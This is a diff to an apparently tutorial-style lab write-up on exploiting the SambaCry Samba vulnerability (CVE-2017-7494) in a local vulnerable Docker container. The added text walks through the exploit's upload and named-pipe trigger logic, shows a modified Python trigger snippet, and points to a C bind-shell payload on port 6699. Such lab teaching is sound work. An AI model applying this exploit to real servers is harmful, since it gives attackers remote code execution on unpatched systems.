@@ -31,6 +31,11 @@ docker run --rm -it \
 	   -p 4444:4444 -p 5555:5555 \
        vulnerables/cve-2017-7494
 ```
+If you get the message : Cannot connect to the Docker daemon... try to start docker first.
+
+```
+service docker start
+```
 
 In case you would like to conect to the docker machine you need to do two things. First determinate the container ID then connect to the container.
 
@@ -53,9 +58,7 @@ nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-
 
 Oh we are vulnerable. I set the target ip to 127.0.0.1 because the docker command we used to start the box binds the port 445 to our local port 445. So we actually targeted the vulnerable box, not our attacker machine.
 
-<h1>Exploit</h1>
-
-<h2>Bind shell</h2>
+<h2>The Exploit</h2>
 
 First let's grab the exploit and install everything needed.
 
@@ -79,4 +82,35 @@ Now we have all setup. But before running it, Let's check the code. Starting wit
 ```
 
 This block is the parameters block. We can see what is needed to run the exploit. We have a remote shell port option too. This is in case we want the code to automatically connect to the bind shell which runs on the target.
-Under that we can see a port already set up to 445. We can change it but SMB wil lprobably be on port 445 so let's leave it for now.
+Under that we can see a port already set up to 445. We can change it but SMB will probably be on port 445 so let's leave it for now. Now let's go to the function named exploit. 
+First we open the smb connection to the target. Then we try to upload the file given in the parameter. Then we execute the exploit.
+
+<h2>Exploit execution<h2>
+This is the actual exploitation part. So far only the exploit code has been uploaded. If everything goes right, this few line will execute the uploaded code. The main idea is, that Samba can load libraries from shared locations. 
+This information will be handy because we know now that only special files can be uploaded and executed. Now, for the execution to work, we need the full path of the uploaded payload. This is the point where in case the payload does not seem to execute,
+you need to make adjustments. The actual malformed request should not be changed just the parameters. First let's not update the code here, but give ourself a better view on what's actually happening by writhing the actual malformed request to console.
+Modified code:
+
+```
+    triggerModule = r'ncacn_np:%s[\pipe\%s]' % (target, remotepath)
+	print("The exploit code section looks like this:")
+	print(triggerModule)
+    rpcTransport = transport.DCERPCTransportFactory(triggerModule)
+    dce = rpcTransport.get_dce_rpc()
+    triggerThread = Thread(target=dceTrigger, args=(dce,))
+    triggerThread.daemon = True
+    triggerThread.start()
+```
+
+After this we only have the handler. In case our payload is a bind shell, this handler will conect to it. We can delete this if we want to connect with a different methode.
+
+<h2>Payload<h2>
+Let's check the payload givven for this exploit. This is a bind shell written in C. Looking at the code of bindshell-samba.c we can see a nicely commented code. Without going into much details, the only thing we need to take a look is where the port is set.
+
+```
+    hostAddr.sin_family = AF_INET;
+    hostAddr.sin_port = htons(6699);
+    hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+```
+
+We can see that the listening port is set to 6699. we can change it anytime. 
